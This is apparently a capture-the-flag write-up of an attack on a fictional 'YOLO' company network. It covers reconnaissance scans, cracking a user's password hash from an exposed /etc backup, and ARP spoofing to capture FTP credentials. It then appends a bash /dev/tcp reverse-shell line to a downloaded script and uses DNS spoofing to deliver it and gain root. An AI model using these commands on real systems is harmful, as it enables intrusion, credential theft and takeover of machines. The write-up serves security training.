YOLO:
provide once in a lifetime experiences (cause you'll die)

CEO-Joe Smith
Chief Safety Officer-Mike Thompson
Head of Experience Design-Sarah Johnson
IT Manager-Dexter Codebourne
Chief Undertaker-Mortimer Caketworth
Funeral Planner-Violeta Gravesend

Products:
Skydiving without a parachute
Swimming with sharks
Cliff jumping with no safety gear
Scuba-diving in active volcanoes
Wireless bungee jumping
High-speed car chase
Realistic plane crash simulator
Space walking in the nude


-Subdomain Enumeration with top 20000:
Brute forcing with /usr/share/wordlists/subdomains.txt:
________________________________________________________

www.yolo.co.il.                          20       IN    CNAME    yolo.co.il.
yolo.co.il.                              20       IN    A        10.1.22.125
ftp.yolo.co.il.                          20       IN    A        192.168.2.8
admin.yolo.co.il.                        20       IN    A        10.1.22.125
www.yolo.co.il.                          20       IN    CNAME    yolo.co.il.
yolo.co.il.                              20       IN    A        10.1.22.125


Trying Zone Transfer for www.yolo.co.il on yolo.co.il ... 
AXFR record query failed: Connection refused


-robots.txt:
# https://www.robotstxt.org/robotstxt.html
User-agent: *
Disallow:

-directory enum:
http://www.yolo.co.il/index.html (CODE:200|SIZE:689)       
http://www.yolo.co.il/robots.txt (CODE:200|SIZE:67)  
DIRECTORY: http://www.yolo.co.il/static/css/
DIRECTORY: http://www.yolo.co.il/static/js/
DIRECTORY: http://www.yolo.co.il/static/media/
---- Scanning DIRECTORY: http://admin.yolo.co.il/backup/


-whatwaf:
[11:05:28][FIREWALL] detected website protection identified as 'Apache Generic'

-nslookup:
www.yolo.co.il	canonical name = yolo.co.il.
Name:	yolo.co.il
Address: 10.1.22.125

-nmap:
tcp:
80/tcp   open  http    Apache httpd 2.4.57 ((Unix))
2222/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
MAC Address: C8:D9:D2:11:E1:F1 (Hewlett Packard)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

udp:
Not shown: 955 closed ports, 44 open|filtered ports
PORT   STATE SERVICE VERSION
53/udp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
MAC Address: C8:D9:D2:11:E1:F1 (Hewlett Packard)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


-WappAlyzer:
  JavaScript frameworks:
    React
    
  Web servers:
    Apache HTTP Server 2.4.57 
    
  Operating systems:
    UNIX
  
  Miscellaneous:   
    Module Federation 50% sure
    PWA
    Webpack 50% sure


-nikto:
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.1.22.125
+ Target Hostname:    www.yolo.co.il
+ Target Port:        80
+ Start Time:         2023-06-20 11:40:40 (GMT3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.57 (Unix)
+ Server leaks inodes via ETags, header found with file /, fields: 0x2b1 0x5fc5beb45d8c0 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ "robots.txt" retrieved but it does not contain any 'disallow' entries (which is odd).
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ 6544 items checked: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2023-06-20 11:40:54 (GMT3) (14 seconds)
---------------------------------------------------------------------------


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

-so we found a backup of etc, it has shadow and passwd (surely there will be a hash inside ^-^)

-we found a hash for dexter:
dexter:$y$j9T$omgc9L.AznoTw36bKRGHj.$uzAwXtqOMkCmalZ9zV5Uip7jUu8nudPbqWDKGjo9IE8:19528:0:99999:7:::

sudo unshadow passwd shadow

-and then john it:
dexter:$y$j9T$omgc9L.AznoTw36bKRGHj.$uzAwXtqOMkCmalZ9zV5Uip7jUu8nudPbqWDKGjo9IE8:1000:1000::/home/dexter:/bin/bash

-john:
john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt passwd.txt
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iloveyou1        (dexter)

-lets ssh to the server

-we connect with the creds, and we have the first flag :)
flag{******************************************}

sudo -i and we are root

-cred extraction using metasploit didnt yield anything useful


-download nmap and ping sweep:

Nmap scan report for 192.168.2.1
Host is up (0.000046s latency).
MAC Address: 02:42:1D:A5:C5:9B (Unknown)

Nmap scan report for dockremap-dns-1.dmz (192.168.2.3)
Host is up (0.000093s latency).
MAC Address: 02:42:C0:A8:02:03 (Unknown)

Nmap scan report for dockremap-ftp-1.dmz (192.168.2.8)
Host is up (0.000037s latency).
MAC Address: 02:42:C0:A8:02:08 (Unknown)

Nmap scan report for 1a4607501dc7 (192.168.2.2)
Host is up.


-port scan the machines:

Nmap scan report for 192.168.2.1
Host is up (0.0000070s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.57 ((Unix))
2222/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
MAC Address: 02:42:1D:A5:C5:9B (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

##################################################################

Nmap scan report for 1a4607501dc7 (192.168.2.2)
Host is up (0.0000050s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.57 ((Unix))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

##################################################################

Nmap scan report for dockremap-dns-1.dmz (192.168.2.3)
Host is up (0.000011s latency).
Not shown: 998 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
53/tcp    open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
10000/tcp open  http    MiniServ 1.941 (Webmin httpd)

##################################################################

Nmap scan report for dockremap-ftp-1.dmz (192.168.2.8)
Host is up (0.000011s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     pyftpdlib 1.5.0
MAC Address: 02:42:C0:A8:02:08 (Unknown)




we are a part of a DMZ at 192.168.2.3 as the web server proxy

192.168.2.1 is our gateway

192.168.2.2 is our DNS server

192.168.2.8 is the FTP server


-it would be a shame if someone thought we are the FTP server while he logs in...

-lets ARP spoof and impersonate as the FTP server while capturing packets

sudo tcpdump -i eth0 -s 65535 -w cap.pcap

sudo venv/bin/python3 mitm.py &

we have some movement!

-analyze the pcap in wireshark, and we spot a login attempt!

-creds:
{ftp_yolo:CyberSec@12}

-there is a script downloaded by the gateway, probably ran after downloaded

-maybe we can get a reverse shell by modifying the script 
append to clock_update.sh:
bash &>/dev/tcp/<my_ip>/<listening_port> <&1

-setup an "impostor" ftp server on our machine, holding the malicious 'clock_update.sh':
https://www.digitalocean.com/community/tutorials/how-to-set-up-vsftpd-for-a-user-s-directory-on-ubuntu-16-04

-dns spoof to our malicious ftp server

-first we analyze dns traffic in the network, we arp mitm the dns server, use tcpdump and wireshark to observe the traffic.

-we learn what proper dns traffic looks like
(we can use scapy to extract DNS requests and replies, and their parameters in scapys syntax - analyze_dns.py)

-write a dns spoofer using scapy (dns_forge.py) 

-setup a nc listener
nc -nlvp <listening_port>

-make sure our ftp server is running

-execute packet sniffing (for debugging purposes), one sided arp spoofing (to impersonate the dns server), and dns spoofing (using our script):
sudo tcpdump -i eth0 -s 65535 -w cap.pcap & sudo env/bin/python3 dns_forge.py & sudo arpspoof -c both -t 192.168.2.1 192.168.2.2 &

-soon enough we spot our malicious file being downloaded, and just like that we get a reverse shell as root on a new machine (192.168.3.2) containing flag2.txt :)
flag2{******************************************************}
